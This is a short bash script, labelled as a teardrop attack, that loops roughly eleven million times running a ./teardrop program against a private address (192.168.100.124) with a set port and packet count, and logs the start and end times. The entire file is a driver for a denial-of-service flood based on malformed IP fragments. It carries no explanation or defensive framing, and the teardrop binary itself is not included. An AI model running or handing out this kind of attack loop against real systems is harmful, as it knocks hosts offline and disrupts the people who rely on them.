#!/bin/bash
echo "teardrop attack start at"
date
k=1;
while [ $k -le 11111111 ]
do
let k+=1;
./teardrop 192.168.100.124 192.168.100.100 -t 1755 -n 50000

done
echo "teardrop attack end at"
date

 
